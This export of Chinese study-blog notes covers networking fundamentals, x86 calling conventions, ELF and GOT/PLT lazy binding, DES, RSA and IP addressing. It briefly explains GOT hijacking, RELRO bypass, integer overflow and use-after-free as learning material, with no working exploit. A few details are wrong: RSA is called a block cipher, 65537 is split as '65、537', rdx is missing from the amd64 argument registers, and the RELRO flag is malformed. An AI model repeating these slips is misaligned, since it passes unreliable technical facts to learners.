    <content type="text"><![CDATA[三类常见的网络：电信网络，有线电视网络，计算机网络。前两者逐渐在发展过程中融合进了计算机网络。 计算机网络由若干节点(node)和链接这些节点的(链路)组成，网络节点可以是计算机，集线器，交换机或路由器等。 在很多情况下，我们可以用一朵云表示一个网络，可以不用关心网络中相当复杂的细节问题。网络之间还可以通过路由器连接起来，这构成一个范围更大的网络，互连网internetwork。 有时为了讨论的方便，可以把有关的计算机画在云的外面，习惯上将与网络相连的计算机称为主机host，这样用云表示的互连网里就只剩下许多路由器和连接这些路由器的链路了。 网络把许多计算机连到一起，互连网把许多网络通过路由器连在一起。与网络相连的计算机称为主机。 internet与Internet：前者只一个通用名词，泛指由多个计算机网络互连而成的计算机网络。这些网络之间的通信协议可以随便选择，不一定TCP/IP。后者专指目前全球最大的最开放的众多网络连接而成的特定互连网，采用TCP/IP。、 ISP：Internet Service Provider，互连网服务提供商。ISP从互连网管理机构申请IP地址，同时拥有通信线路。上网指的就是通过从ISP获得的IP地址接入到互联网。 根据提供服务的覆盖面积大小以及IP地址数目，ISP分为主干ISP(专门公司创建，拥有高速主干网)，地区ISP(较小的ISP，通过一个或多个主干ISP连接)，本地ISP(给用户直接提供服务，可以是拥有网络并向自己雇员提供服务的企业，也可以是如大学等运行自己网络的非营利性机构。) IXP：Internet eXchange Point:允许两个网络直接连接并交换分组，比如直接连接两个地区ISP。典型的IXP由一个或多个网络交换机组成，许多ISP再连接到这些网络交换机的相关端口上。 互联网从工作方式上看可以划分为以下两大块： 边缘部分：由所有连接在互联网上的主机组成，这部分时用户直接使用的，用来进行通信与资源共享。 核心部分：由大量网络以及连接这些网络的路由器组成，这个部分为边缘部分 提供服务(连通性与交换)。 路由器：连接两个或多个网络的硬件设备，在网络间起网关的作用，是读取每一个数据包中的地址然后决定如何传送的专用智能性的网络设备。它能够理解不同的协议，例如某个局域网使用的以太网协议，因特网使用的TCP/IP协议。这样，路由器可以分析各种不同类型网络传来的数据包的目的地址，把非TCP/IP网络的地址转换成TCP/IP地址，或者反之；再根据选定的路由算法把各数据包按最佳路线传送到指定位置。所以路由器可以把非TCP/ IP网络连接到因特网上。 网关(Gateway)又称网间连接器、协议转换器。网关在网络层以上实现网络互连，是复杂的网络互连设备，仅用于两个高层协议不同的网络互连。网关既可以用于广域网互连，也可以用于局域网互连。 网关是一种充当转换重任的计算机系统或设备。使用在不同的通信协议、数据格式或语言，甚至体系结构完全不同的两种系统之间，网关是一个翻译器。与网桥只是简单地传达信息不同，网关对收到的信息要重新打包，以适应目的系统的需求。 网桥是一种对帧进行转发的技术，根据MAC分区块，可隔离碰撞。网桥将网络的多个网段在数据链路层连接起来。也叫桥接器，是连接两个局域网的一种存储/转发设备，它能将一个大的LAN分割为多个网段，或将两个以上的LAN互联为一个逻辑LAN，使LAN上的所有用户都可访问服务器。 网段（network segment）一般指一个计算机网络中使用同一物理层设备（传输介质，中继器，集线器等）能够直接通讯的那一部分。 进程：运行着的程序。 在网络边缘的端系统之间的通信方式通常分为两大类：客户-服务器(C/S)方式，对等方式(P2P)。 客户-服务器方式:最常用，最传统的方式。客户和服务器都是指通信中所涉及的两个应用进程，都要使用网络核心部分所提供的服务。 客户程序：被用户调用后运行，在通信时主动向原地服务器发起请求服务，因此客户程序必须知道服务器程序的地址。不需要特殊硬件。复杂操作系统。 服务器程序：一种专门用来提供某种服务的程序，可以同时处理多个请求。系统启动后即自动调用并不断运行。被动接受请求，不知道客户端地址。一般拥有强大而硬件和高级操作系统支持。 衡量计算机网络性能的七个指标： 速率：计算机发出的信号都是数字形式的。比特的意思是一个“二进制数字”，是信息论中使用的信息量的单位。网络技术中的速率指的是数字传送速率，也称为数据率或比特率。 带宽bandwidth：指某个信号具有的频带宽度。信号的带宽是指该信号所包含的各种不同频率所占据的频率范围。这种意义的带宽的单位是赫。在过去很长一段时间，通信主干线传送的是模拟信号（连续变化的信号），因此表示某信道允许通过的信号频带范围就称之为该信道的带宽。|在计算机网络中，带宽用来表示网络中某通道传送数据的能力，因此网络带宽表示在单位时间内网络中的某信道所能通过的“最高数据率”。这种意义带宽的单位就是数据率的单位bit/s。前者为频域称谓，后者为时域称谓。 吞吐量throughput表示在单位时间内通过某个网络的实际数据量。更经常地用于对现实世界中的网络的一种测量。 时延delay是指数据从网络或链路的一端传送到另一端所需的时间，由发送时延，传播时延，处理时延以及排队时延组成。发送时延是主机或者路由器发送数据帧所需要的时间，也就是从发送数据帧的第一个bit算起，到全部发完所需的时间。传播时延：是电磁波在信道中传播一定的距离需要花费的时间。处理时延：主机或者路由器在收到分组时花费一定的时间进行处理，从而产生的时延。排队时延：分组在经过网络传输时，要经过很多路由器。进入路由器的时候要现在输入队列中排队等待处理。确定转发接口周还要在输出队列中排队等待转发。排队时延取决于网络当时的通信量。其特别大的时候还会导致队列溢出，分组丢失。 在计算机网络中要做到有条不紊地交换数据，就必须遵守事先约定的规则，这些规则明确规定了所要交换的数据地格式以及同步问题。这些为进行网络中的数据交换而建立的规则，标准或者约定称为网络协议。 网络协议的组成：语法，数据与控制信息的结构或者格式。语义，需要发出何种控制信息，完成何种动作，作出何种响应。同步，事件实现顺序的详细说明。 ![QQ图片20200302164850](D:\My Daily\P\QQ图片20200302164850.png) 计算机网络就是学习协议的体系结构。下层向上层提供服务。 应用层（application layer)：应用层是体系结构中的最高层。应用层的任务是通过应用进程间的交互来完成特定的网络应用。应用层协议定义的是应用进程之间通信和交互的规则。这里的进程就是指主机中正在运行的程序。应用层交互的数据单元称为报文（message）。 运输层（transport layer）：运输层的任务就是负责向两台主机中进程之间的通信提供通用的数据传输服务。多种应用可以同时使用一个运输层服务。运输层有分用和复用的功能，复用就是多个应用层进程可以同时使用下面运输层的服务。分用则是运输层把收到的信息分别交付上面应用层中的相应进程。运输层主要使用以下两种协议：传输控制协议TCP（Transmission Control Protocol）提供面向连接的，可靠的数据传输服务，其数据传输的单位是报文段（segment）。用户数据协议UDP（User Datagram Protocol）提供无连接的，尽最大努力best-effort的数据传输服务。其传输的单位是用户数据报。 网络层（network layer）：网络层负责为分组交换网上的不同主机提供通信服务。在发送数据时，网络层把运输层产生的报文段或用户数据报封装成分组或包进行传送。即分组交换。在TCP/IP体系中，由于网络层使用IP协议，因此分组也叫做IP数据报。网络层的另一个任务就是要选择合适的路由，使源主机运输层所传下来的分组，能够通过网络（专指第三层，非普通网络）中的路由器找到目的主机。互联网是由大量的异构网络通过路由器（ruter）相互连接起来的。互联网使用的网络层协议是无连接的网际协议IP和许多种路由选择协议。因此互联网的网络层也叫做网际层或IP层。]]></content>
  </entry>
  <entry>
    <title><![CDATA[长亭公开课-二进制程序基础原理入门]]></title>
    <url>%2F2020%2F04%2F14%2F%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[[TOC] 二进制基础程序的编译，汇编与链接编译：gcc -S，将源代码.c文件编译成.s的汇编代码 汇编：gcc/as，将.s汇编代码汇编成.o的目标文件 链接：gcc/ld，将库文件libA.a/libB.so与.o目标文件链接成可执行程序。库文件是可复用的代码(包括函数或变量)集合，用于向其他程序提供代码。静态库.a中的代码和数据会完整拷贝到可执行程序中，而动态库.so则需要在程序运行时通过动态链接的方式加载。 指令执行的五步过程：取指令，指令译码，指令执行，访存取数，结果写回。(并不是每个都有五步)。 栈：一种先进后出的数据结构，被用于函数的局部内存管理：保存局部变量，保存函数的调用信息（如返回地址）。栈往低地址方向增长，esp寄存器永远指向栈顶。入栈push esp=esp-4，出栈pop esp=esp+4. X86的寻址模式： 立即数寻址：立即数包含在指令中，紧接在操作码之后成为指令的一部分。 1mov al,5 寄存器寻址：操作数在寄存器中，指令指定寄存器。 1mov ax，bx 直接内存寻址：操作数在内存中，指令直接指定内存地址。 1mov ax，[2000h] 寄存器间接寻址：操作数在内存中，操作数的地址在寄存器中。 1mov eax，[ebx] 索引寻址：通过基址寄存器内容加上一个索引值来寻址内存中的数据。 1mov ax，[di+200h] 相对基址索引寻址：用一个基址寄存器加上一个变址寄存器再加上一个偏移量来完成内存单元的寻址。 1mov sh,[bx+si+100h] 比例变址寻址：通过基址寄存器的内容加上变址寄存器的内容与一个比例因子的乘积来寻址内存中的数据。 1mov eax,[ebx+4*ecx] X86机器指令入门pop和push都可以分成对栈的操作和对数据操作两条指令。 lea：load effective address 123lea &lt;reg32&gt;,&lt;mem&gt;lea eax,[var]将地址var放入寄存器eax中lea edi,[ebx+4*esi]即edi=ebx+ 4*esi 某些编译器会使用lea来进行算数运算，速度更快。 调用约定实现底层的规范，约定了函数之间如何传递参数，与欸的那个了函数如何传递返回值。 常见X86调用约定： Caller Clean-up，调用者负责清理栈上的参数：cdecl，optlink。 Callee Clean-up，被调者负责清理栈上的参数：stdcall，fastcall。 开辟栈帧时预留更多字节的空间(一般是16的倍数)，是为了内存中的字节对齐的需求。 调用函数后栈帧的布局要牢记，自己画一下。关于存放局部变量与参数的问题讲的挺详细。开辟栈帧之后sub 0X10，esp为了预留空间存放局部变量，也就是在函数中定义的变量。此时调用函数，再特地将esp下移，存放参数，参数可以用ebp+xx的偏移量表示。所以会存在中间有unused dword的情况。 cdecl在调用者的代码中会有add 0xxx，esp的操作，实际就是在清理栈上的参数。 leave：用于清理的指令。 12mov esp,ebp//push ebppop ebp//mov ebp，esp，然后再开辟栈帧。 通过ebp恢复esp X86(32位)cdecl调用约定：用栈传递参数，用寄存器eax来保存返回值。 amd64(64位)cdecl调用约定：使用寄存器rdi，rsi，rcx，r8，r9来传递前六个参数，第七个及以上的参数通过栈来传递。 栈帧指针ebp/rbp用途：索引栈上的参数，保存栈顶位置。 上一层栈帧指针 参数arguments 返回地址return address 保存的栈帧指针 被调者保存的寄存器 ←ebp 局部变量 ←esp Linux x86进程内存空间布局： 内核 0xFFFFFFFF 栈 0xc0000000 ↓ 共享库Shared Library ↑ 0x40000000 堆Heap 数据Data 代码Text 0x08048000 Unused 0x00000000 右边的地址表示左边的块结束的地址。 高地址为内核区域，用户无权访问，低地址为用户区域，在内核没有开启SMAP时，内核代码可以访问用户空间数据，在内核没有开启SMEP保护时，内核态可以执行用户区域代码。 不同进程虽然看到的都是08048000，但是实际的物理地址是不一样的，只是操作系统将其统一了。 ELF与动态链接ELF文件格式Executable and Linkable Format，一种Linux下常用的可执行文件，对象，共享库的标准文件格式。还有其他可执行文件格式PE,Mach-O，COFF，COM。内核中处理ELF相关代码参考fs/binfmt_elf.c。ELF中的数据按照Segment和Section两个概念划分。 Segment用于告诉内核，在执行ELF文件时应该如何映射内存。每个Segment主要包含加载地址，文件中的范围，内存权限，对齐方式等信息，是运行时必须提供的信息。 Section用于告诉连接器ELF中每个部分是什么，哪里是代码，哪里是只读数据，哪里是重定位信息。在文件的每个部分都有。每个Section主要包含Section类型，文件中的位置，大小等信息。链接器依赖Section将不同的对象文件的代码，数据信息合并，并修复引用。 segment与segment的关系：相同权限的Section会放入同一个Segment，例如.text和.rodata setion（都是只读）。一个Segment包含许多Section，一个Section可以属于多个Segment（以4KB为单位一页一页映射，会映射过多的section）。 ELF文件类型： 可执行文件ET_EXEC,可直接运行的程序，必须包含segment。 对象文件ET_REL,*.o，需要与其他对象文件链接，必须包含section。 动态库ET_DYN,*,so，与其他对象文件/可执行文件链接，必须同时包含segment与section。 ELF header Program header table .text 只读 .rodata 只读 … 可读写 .data 可读写 Section header table ELF Header包含架构，ABI版本(包含调用约定)等基础信息,以及program header table的位置和数量，section header table的位置和数量。 Program header table中每个表项定义了一个segment，每个segment可包含多个section。 Setion header table中每个表项定义一个section。 动态链接与延迟绑定动态链接**：一种运行时才会加载和链接程序所依赖的共享库的技术，Linux最常见的共享库是libc。 重定位(Relocations)：指二进制文件中的待填充项，在程序运行之后重新填充的过程。静态链接中，链接器在链接时填充，例如链接多个目标文件的时候，修正相互引用的函数，变量地址。而动态链接中在运行时填充。 延迟绑定：外部函数的地址在运行时才会确定，外部函数符号在首次调用时才会被解析（外部变量不使用延迟绑定机制）。 GOT表(Global Offset Table)：用于存放外部库函数地址。初始状态指向一段代码(PLT,过程链接表，Procedure Linkage Table)。当库函数首次调用，真正的函数地址会被解析并填入相应的GOT表项。每个外部函数均有一段PLT代码，用于跳转到响应GOT表项中存储的地址。 例如调用puts函数，从gdb中看是： 12345678call 0X80482e0 &lt;puts@plt&gt;0x80482e0 &lt;puts@plt&gt;:jmp *0x804a00c(跳转到puts对应的GOT表项，初始状态指向puts@plt+6)0x80482e6 &lt;puts@plt+6&gt;:push $0x0（传入第一个参数0）0x80482eb &lt;puts@plt+11&gt;:jmp 0x80482d0（跳转到0x80482d0，这种地址一般称为PLT0）0x80482d0：push 0x804a004（传入第一个参数0x804a004，此处存的是Link_map）0x80482d6：jmp *0x804a008（跳转到*0x8048008，_dl_runtime_resolve) 也就是说第一次调用外部函数时，执行PLT代码第一行跳转到第二行，第二行传参后执行第三行传参Link_map，后继续跳转执行_dl_runtime_resolve(运行时解析，一个用来解析动态链接函数的函数)，执行完后GOT表中就会有正确的函数运行地址，而后面调用时就无需跳转。 .got Section中存放外部全局变量的GOT表，非延迟绑定。 .got.plt Section中存放外部函数的GOT表，采用延迟绑定。 .got.plt（解析前） .got.plt（解析后） .dunamic.section地址 .dunamic.section地址 link_map地址 link_map地址 _dl_runtime_reslove地址 _dl_runtime_reslove地址 puts@plt+6 puts .got.plt前三项有特殊含义： .dynamic section,为动态链接提供信息。 link_map，一个链表，包含所有加载的共享库信息。 _run_time_reslove,位于loader中，用于解析外部函数符号的函数。解析完成之后会直接执行该函数。 从全局中看，.got.plt是sections的一部分： .dynamic .got .got.plt .data 其中的.got.plt细分为： .dynamic section地址 link_map地址 _dl_runtime_reslove地址 (从第四项开始就是外部函数的GOT表项) .plt Section中存放所有外部函数的plt表项。 GOT表劫持攻击延迟绑定机制要求GOT表必须可写，内存泄露可导致GOT表项被改写，从而劫持PC。 防御GOT表劫持：重定位只读缓解措施,在编译时加入以下参数 1gcc-z,relro 原理：在进入main()之前，所有的外部函数都会被解析。所有GOT表设置为只读。 绕过方法：劫持为开启该保护的动态库中的GOT表/改写函数返回地址或者函数指针。 IO2BO，利用对signed和unsigned的过滤不充分，用负数产生溢出。 数组下标越界 123if (index&lt;arr_size)&#123; arr[index]=value&#125; 当index为负数，即可绕过条件indeex&lt;arr_size，在数组写入时可产生越界。 类型转换导致整数溢出。 释放后利用UAF结构/对象在释放（free/delete）后，其引用依然被错误地使用，称为释放后利用。该利用采用代码审计/逆向分析的方法用肉眼找对水平要求非常高，目前大部分UAF都是通过模糊测试发现。修复：要对释放的对象/结构及时置空指针。]]></content>
  </entry>
  <entry>
    <title><![CDATA[GOT表和PLT表知识详解]]></title>
    <url>%2F2020%2F04%2F13%2FGOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[今天听了可以说是安全之路的启蒙大佬的CTF培训(高中看了一篇写清华蓝莲花和DEF CON黑客大会的微信文章，打开了网络安全的大门)。印象比较深的就是GOT表和PLT表的相关技术，用一个动态的过程展现了出来，实在是有种要到病除的感觉。后面讲常见的segement与section区别，二进制漏洞，栈溢出，格式化字符串，整数溢出（联想到了-1印象比较深）。感觉挺可惜的，有些很好的总结都没有截图下来进程在内存中的加载啥的。 当.text代码段中调用了一个位于glibc动态库内的函数时，编译和链接阶段，链接器无法知道进程运行之后该函数的加载地址，所以在call 该函数地址时，函数地址是空的。只有进程运行之后，该函数地址才能确定。 当进程运行之后，glibc装载了，函数地址确定了，如何修改(重定位)？由于现代操作系统不允许直接修改代码段，只能修改数据段，并且如果调用该函数的函数是在一个动态库.so文件里，那么就无法做到系统内所有进程共享一个动态库。因此函数地址只能回写到数据段内，而不能回写到代码段上。 我们把获取数据段存放函数地址的那一小段代码称为PLT（Procedure Linkage Table）过程链接表，存放函数地址的数据段称为GOT（Global Offset Table）全局偏移表。PLT表中的数据就是GOT表中的一个地址，可以理解为一定是一一对应的。 调用一个函数的时候，先call &lt; name@plt &gt;，name@plt即为这个表中数据的地址，也就是GOT表的地址。GOT表的地址会由_dl_runtime_resolve重写。]]></content>
  </entry>
  <entry>
    <title><![CDATA[DES]]></title>
    <url>%2F2020%2F04%2F07%2FDES%2F</url>
    <content type="text"><![CDATA[简介： DES是对称的，也就是说它使用同一个密钥来加密和解密数据。DES还和RSA一样是一种分组加密算法，该算法每次处理固定长度的数据段，称之为分组。DES分组的大小是64位，如果加密的数据长度不是64位的倍数，可以按照某种具体的规则来填充位。 从本质上来说，DES的安全性依赖于虚假表象，从密码学的术语来讲就是依赖于“混乱和扩散”的原则。混乱的目的是为隐藏任何明文同密文、或者密钥之间的关系，而扩散的目的是使明文中的有效位和密钥一起组成尽可能多的密文。两者结合到一起就使得安全性变得相对较高。 DES算法具体通过对明文进行一系列的排列和替换操作来将其加密。过程的关键就是从给定的初始密钥中得到16个子密钥的函数。要加密一组明文，每个子密钥按照顺序（1-16）以一系列的位操作施加于数据上，每个子密钥一次，一共重复16次。每一次迭代称之为一轮。要对密文进行解密可以采用同样的步骤，只是子密钥是按照逆向的顺序（16-1）对密文进行处理。 ![分组加密](D:\My Daily\P\a61af216-b685-3141-8919-9e585d0b7556.png) ![DES加密过程总览](D:\My Daily\P\57006f38-2576-3e9a-af0c-522b1f16eb2a.jpg) ![密钥生成](D:\My Daily\P\c15593ad-5a4c-3782-919b-ea04ca82b8c1.jpg) ![具体过程](D:\My Daily\P\d730d46d-d62e-3126-b98a-8e37405a1ec0.jpg) 获取子密钥Ki共16个：DES的初始密钥K为64位，按8行8列从左往右从上往下排列，其中每行第8位用于奇偶校验，因此Key实际可用位数为56。 ​ 首先，64位的初始密钥K经过PC-1之后，生成56位的串。 ![e36ece9b-d47c-3a27-8533-027a1f36c762](D:\My Daily\P\e36ece9b-d47c-3a27-8533-027a1f36c762.png) 由表可知，初始密钥K第8、16、24、32、40、48、56、64共8个校验位被去掉，剩余56位按表所示方式排列：第57位放在第1位，第49位放在第2位，依次类推。 经过PC-1置换之后，将置换输出再分为前28位C0和后28位D0两部分，分别循环左移1位得到C1和D1，然后将两部分合并成56位，然后经过PC-2变换之后生成48位的子密钥K1。 ![78c0a354-e216-32db-9310-d1f3abcaf1b5](D:\My Daily\P\78c0a354-e216-32db-9310-d1f3abcaf1b5.png) ​ C1、D1分别循环左移1位得到C2、D2，合并经过PC-2生成子密钥K2。依次类推，直至生成子密钥K16。注意，每轮循环左移的位数有如下规定： ![78c0a354-e216-32db-9310-d1f3abcaf1b5](D:\My Daily\P\78c0a354-e216-32db-9310-d1f3abcaf1b5.png) 至此，加密过程需要的16个子密钥全部生成完毕，下面我们来看具体如何加密。 加密过程：初始置换： 64位明文串经过一个初始置换函数IP，生成重新排列之后的64位输出，分为左32位L0和右32位R0，用于F函数16轮迭代运算的首次迭代的初始![5e1046ae-8449-3f2a-98ad-e16ae4fee37c](D:\My Daily\P\5e1046ae-8449-3f2a-98ad-e16ae4fee37c.png)输入。 迭代运算：R0与子密钥K1经过密码函数变换F(R0,K1)得到32位输出f1，f1与L0做二进制异或运算，结果赋给R1，R0则原封不动地赋给L1。然后R1与子密钥K2经过函数变换F(R1,K2)得到32位输出f2，f2与L1做二进制异或运算，结果赋给R2，R1则原封不动地赋给L2….依此类推，一共经过16次迭代运算直至最后生成L16和R16。 F函数： 密码函数F接受两个输入：32位数据和48位子密钥，输出结果为32位。具体运算如下： 扩展置换： 32位数据通过扩展置换E从32位扩展为48位，扩展置换通过将原32位数据中的某些位重复出现达到扩展的目的。 ![1ad0eab2-2430-306f-a3e2-ee367e52844d](D:\My Daily\P\1ad0eab2-2430-306f-a3e2-ee367e52844d.png) 异或运算：扩展置换的输出(48位)与子密钥(48位)做异或运算，输出为48位。 S盒置换：将异或运算得到的48位结果数据分成8个6位的块，每块通过对应的一个S盒产生一个4位的输出。8个6位数据的置换结果连在一起，形成32位输出结果。每个S盒实际上是一张4(0-3)行16(0-15)列的置换表，注意，行列编号都从0开始。 S盒接收6位的数据，经过置换输出4位的数据，其具体置换过程为：将6位数据的第1位和第6位取出来，形成一个2位的二进制数x（从0-3），剩下的4位构成另一个二进制数y（从0-15），然后查出S盒x行y列对应的十进制整数，将该整数转换为一个4位二进制数，即为S盒的输出。 ![656691cd-0026-3fa4-8f52-d6de1afc655e](D:\My Daily\P\656691cd-0026-3fa4-8f52-d6de1afc655e.jpg) P盒置换：S盒置换的最终结果32位数据通过P盒置换，同样生成32位输出结果。 ![d0d97c5e-174c-3dd5-b905-90f00db13101](D:\My Daily\P\d0d97c5e-174c-3dd5-b905-90f00db13101.png) 末置换： L16、R16合在一起64位，经过末置换函数IP-1，得到64位密文输出。 ![fccf3950-2019-3c20-a910-5c342b550be4](D:\My Daily\P\fccf3950-2019-3c20-a910-5c342b550be4.png)]]></content>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA]]></title>
    <url>%2F2020%2F04%2F07%2FRSA%2F</url>
    <content type="text"><![CDATA[简介： RSA是非对称的，即加密密钥与解密密钥不是同一个。当数据在网络中传输时，用来加密数据的密钥并不需要也和数据一起传送，这就减少了密钥泄露的可能性。加密的一方使用一个密钥称为共压迫，解密的一方使用一个密钥称为私钥，私钥需保持其私有性。 单向函数是加密技术的基础，简单地说就是在一个方向上能够很容易算出结果，但是反向推导则不切实际。 计算公钥与私钥： 公钥P=(e,n),私钥S=(d,n) 首先选出两个大素数pq，然后开始计算n，n=pq。 接下来选择一个较小的奇数e，选择的重点是他与(p-1)(q-1)不能有相同的因子。通常选择3、17、65、537作为e的值。使用这些值不会对RSA的安全性造成影响，因为解密数据还需要用到私钥。 接下来开始计算d,d = e-¹ mod (p-1)(q-1)即d与e是模乘法逆元的关系。ed mod (p-1)(q-1) = 1。欧几里得算法可求得。 加密流程：m^e mod n=c 解密流程：c^d mod n=m 尽管攻击者可能知道了e和n的值，为了计算出d必须知道φ(n)，而这又必须同时得到p和q的值才能办到。由于p和q是不可知的，因此攻击者只能计算n的因子，只要给出的p和q的值足够大，这就是一个相当耗费时间的过程。]]></content>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络层]]></title>
    <url>%2F2020%2F04%2F04%2F%E7%BD%91%E7%BB%9C%E5%B1%82%2F</url>
    <content type="text"><![CDATA[本章讨论网络互连问题：介绍网络层提供的两种不同服务之后，进入本章核心内容：网际协议IP。只有深入地掌握了IP协议的主要内容，才能够理解互联网是如何工作的。并讨论：网际控制报文协议ICMP，几种常用的路由选择协议，IPv6的主要特点，IP多播的概念，虚拟专用网VPN和网络地址转换NAT以及多协议标记交换MPLS。 本章最重要的内容： 虚拟互联网络的概念。 IP地址与物理地址的关系。 传统的分类IP地址(包括子网掩码)和无分类域间路由选择CIDR。 路由选择协议的工作原理。 由于跳着学，回顾下五层协议：从顶向下分别是应用层，运输层，网络层，数据链路层和物理层。 网络层提供的两种服务：在计算机网络领域，网络层应该向运输层提供怎样的服务(面向连接/无连接)引起争论：实质就是在计算机通信中可靠交付应当由网络还是端系统负责？ 如果让网络负责可靠交付，用面向连接的通信方式，就像传统电信网一样，那么当两台计算机进行通信时也应当先建立连接(但在分组交换中是建立一条虚电路VC)，以预留双方通信所需的一切网络资源。然后双方就沿着已建立的虚电路发送分组。这样的分组首部不需要填写完整的目的主机地址，而只需要填写这条虚电路的编号。 但是另一种新的设计思路认为计算机网络的端系统是有智能的计算机，有很强的差错处理能力。所以网络层向上只提供简单灵活的，无连接的，尽最大努力交付的数据报服务。数据包datagram/IP数据报就是我们经常使用的”分组”。网络在发送分组时不需要建立连接，每一个分组独立发送。网络层不提供服务质量的承诺。由于传输网络不提供端对端的可靠传输服务，这就使得网络中的路由器比较简单，并且价格低廉。如果端系统中进程的通信需要是可靠的，就由网络的主机中的运输层负责。这种方式为互联网的广泛发展奠定基础。 鉴于TCP/IP体系的网络层提供的是数据报的服务，因此围绕网络层如何传输IP数据报这个主题展开讨论： 网际协议IP：网际协议IP是TCP/IP体系中两个最主要的协议之一(顾名思义)，与IP协议配套的还有三个协议：地址解析协议ARP，网际控制报文协议ICMP，网际组管理协议IGMP。 ![QQ图片20200404120326](D:\My Daily\P\QQ图片20200404120326.png) 在这一层中ARP位于最下面，因为IP经常要使用这个协议。ICMP和IGMP位于这一次上部，因为它们要使用IP协议。由于网际协议IP是用来使互连的计算机之间实现通信的，因此TCP/IP体系中的网络层通常称为网际层/IP层。 虚拟互联网络： 由于没有一种单一的网络能够适应用户的所有需求，所以将网络互相连接起来需要使用一些中间设备。根据中间设备所在的层次，可以有以下四种不同的中间设备： 物理层使用的中间设备叫做转发器(repeater). 数据链路层使用的中间设备叫做网桥/桥接器(bridge). 网络层使用的中间设备叫做路由器(router). 在网络层以上使用的中间设备叫做网关(gateway).用网关连接两个不兼容的系统需要在高层进行协议的转换。 当中间设备是转发器或者网桥时，这仅仅时把一个网络扩大了，从网络层的层次来看，这仍然是一个网络，所以一般不称之为网络互连。网关由于比较复杂，目前使用地比较少，因此讨论网络连接时，都是指用路由器进行网络互连和路由选择。路由器其实就是一台专用计算机，用于在互联网中进行路由选择。由于历史的原因，许多有关TCP/IP的文献吧网络层使用的路由器称为网关。 许多计算机网络通过一些路由器进行互连，由于参加互连的计算机网络都使用相同的网际协议IP:Internet Peotocol，因此可以把互联以后的计算机网络看成一个虚拟互连网络internet。 所谓虚拟互连网络也就是逻辑互连网络，互连起来的各种虚拟物理网络的异构型是客观存在的，但是利用IP协议能将其统一成在网络层上看起来时统一的网络。这种使用IP协议的虚拟互连网络简称IP网。使用IP网之后，当其中的主机进行通信时，就好像在单个网络上进行通信，而不用关心具体的异构细节。在这种覆盖全球的IP网的上层使用TCP协议，那么就是现在的互联网Internet。 分类的IP地址：IP地址及其表示方法：整个的互联网就是一个单一的抽象网络，IP地址就是给互联网上的每一台主机/路由器的每一个接口分配一个在全世界范围内是唯一的32位标识符，它由互联网名字和数字分配机构ICANN进行分配。IP地址的编址方法经历了三个阶段：1：分类的IP地址，最基本方法。2：子网的划分，改进。3：构成超网。 所谓分类的IP地址指的就是将IP地址划分为若干个固定类，每一类地址都由两个固定长度的字段组成，其中一个字段是网络号net-id，它标志主机所连接到的网络。一个网络号在世界范围内是唯一的。另一个字段是主机号host-id，标志该主机或路由器，在其前面的网络号所指明的网络范围内必须是唯一的。可见IP地址在整个互联网范围内是唯一的。 ![QQ图片20200405162458](D:\My Daily\P\QQ图片20200405162458.png) ABC三类地址都是单播地址(一对一通信)，最常用。网络号分别为1，2，3个字节长，主机号分别为3，2，1个字节长。 IP地址不仅仅指明一台主机，还指明了主机所连接到的网络。通常用点分十进制表示。 常用的三种类别的IP地址：A类地址的网络号字段占1个字节，有七位可以使用，但可以指派的网络号为126个，其一是网络号字段全为0表示的IP地址是个保留地址，意思是本网络。网络号127保留作为本地软件环回测试本主机进程之间的通信之用。若主机发送一个目的地址为环回地址的IP数据报，则本集中的协议软件就处理数据报中的数据，而不会把数据报发送到任何网络，网络号为127的地址根本不是一个网络地址。 A类地址的主机号占三个字节，每一个A类网络中的最大主机数是2²⁴-2.减二的原因是：全零的主机号字段表示该IP地址是本主机所连接道德单个网络地址，如一主机的IP是4.X.X.X,则该主机所在的网络地址就是4.0.0.0.而全1表示所有的，即全1的主机号字段表示该网络上的所有主机。A类地址占所有IP地址的一半。 B类地址的网络号字段有两个字节，前2位固定所以只剩下14位可以使用。不存在整个两字节网络号字段全为0或1的状况，但是实际上B类网络地址128.0.0.0是不指派的，可以指派的最小网络地址是128.1.0.0，因此B类网络地址可指派的网络数为2¹⁴-1B类地址每一个网络上的最大主机数是2¹⁶-2即65534，减二也是去除全0与全1.B类占总IP地址数 25%。 C类地址有3个字节的网络号字段，前3位110，剩下21位进行分配。C类地址192.0.0.0也是不指派的，可以指派的C类最小网络地址是192.0.1.0，易知C类地址可指派的网络总数十2²¹-1，每一个C类地址的最大主机数是2⁸-2。整个C类地址空间共约有2²⁹个，占总IP地址的八分之一。 ![QQ图片20200427144101](D:\My Daily\P\QQ图片20200427144101.png) IP地址的特点： 每个IP地址都由网络号和主机号组成，从这个意义上说它是分等级的地址结构。分级的好处在于IP地址管理机构在分配IP时只分配网络号，而主机号则由得到该网络号的单位自行分配。并且路由器仅根据目的主机所连接的网络号来转发分组而不考虑主机号，这样可以使路由表中的项目数大幅减少从而减少路由表所占的存储空间以及查找路由表时间。 实际上IP地址是标志一台主机/路由器和一条链路的接口。当一台主机同时连接到两个网络上时，该主机就必须同时具有两个相应的IP地址，其网络号必须是不同的（与路由器转发分组只看网络号有关），这种主机称为多归属主机multihomed host。由于一个路由器至少连接到两个网络，因此一个路由器至少应当有两个不同的IP地址。路由器的灭一个接口都有以恶搞不同的IP地址。 一个网络是指具有相同网络号net-id的集合，所以用转发器或网桥连接起来的若干个局域网仍然为一个网络。不同网络号的局域网必须使用路由器进行互连。 在IP地址中，所有被分配到网络号的网络都是平等的，即互联网平等对待每一个IP地址。 当两个路由器直接相连，在连线两端的接口处，可以分配也可以不分配IP地址。如分配则这一段连线构成了一种只包含一段线路的特殊网络，称为无编号网络/无名网络。现在为了节省资源常常不分配IP地址。 IP地址与硬件地址主机的IP地址与硬件地址的区别:从层次的角度上看，物理地址是数据链路层和物理层使用的地址，而IP地址是网络层和以上各层使用的地址，是一种逻辑地址。 